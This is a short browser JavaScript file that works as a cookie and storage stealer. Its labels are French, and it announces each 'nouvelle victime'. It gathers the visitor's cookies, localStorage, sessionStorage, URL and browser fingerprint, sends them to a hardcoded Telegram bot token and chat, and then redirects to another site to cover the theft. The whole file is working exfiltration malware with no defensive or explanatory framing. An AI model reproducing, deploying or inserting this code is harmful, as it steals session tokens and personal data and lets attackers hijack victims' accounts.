const chat_id = "-4887795296";
const token = "8108131208:AAHjj8T8blfStEhd9mpMd0b0S6Vt9G8mumI";

function escapeTelegram(text) {
  return text.replace(/[`_*[\]()~>#+-=|{}.!]/g, '\\$&');
}

function getPlugins() {
  if (!navigator.plugins) return "None";
  const names = [];
  for(let i=0; i < navigator.plugins.length; i++) {
    names.push(navigator.plugins[i].name);
  }
  return names.length ? names.join(", ") : "None";
}

function tryStorage(storage) {
  const result = {};
  try {
    for(let i=0; i < storage.length; i++) {
      const key = storage.key(i);
      result[key] = storage.getItem(key);
    }
  } catch {
    return "Access denied";
  }
  return JSON.stringify(result);
}

const data = {
  "🔔 Nouvelle victime !": "",
  "🌐 URL": location.href,
  "🍪 Cookie": document.cookie || "No cookies",
  "🧠 User Agent": navigator.userAgent,
  "🌍 Langue": navigator.language || navigator.userLanguage,
  "🖥️ Résolution": `${screen.width}x${screen.height}`,
  "⏰ Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
  "🧩 Plugins": getPlugins(),
  "🔙 Referrer": document.referrer || "None",
  "🕒 Heure locale": new Date().toString(),
  "📂 localStorage": tryStorage(localStorage),
  "📂 sessionStorage": tryStorage(sessionStorage),
  "🧑‍💻 Plateforme": navigator.platform,
};

let msg = "";
for (const key in data) {
  msg += `*${key}* : ${data[key]}\n`;
}

fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id,
    text: escapeTelegram(msg),
    parse_mode: "MarkdownV2"
  }),
}).catch(e => console.error("Telegram send error:", e))
.finally(() => {
  // Redirection après envoi du message
  window.location.href = "https://www.axiomboost.xyz/";
});
